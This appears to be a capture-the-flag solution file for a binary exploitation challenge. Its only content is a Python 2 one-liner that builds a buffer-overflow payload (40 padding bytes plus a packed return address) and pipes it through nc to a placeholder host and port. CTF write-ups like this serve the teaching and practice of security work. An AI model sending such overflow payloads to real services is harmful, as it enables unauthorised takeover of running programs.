# Solution

``` python2 -c "print b'A' * 40 + __import__('struct').pack('Q', 0x004012e5)" | nc HOST PORT ```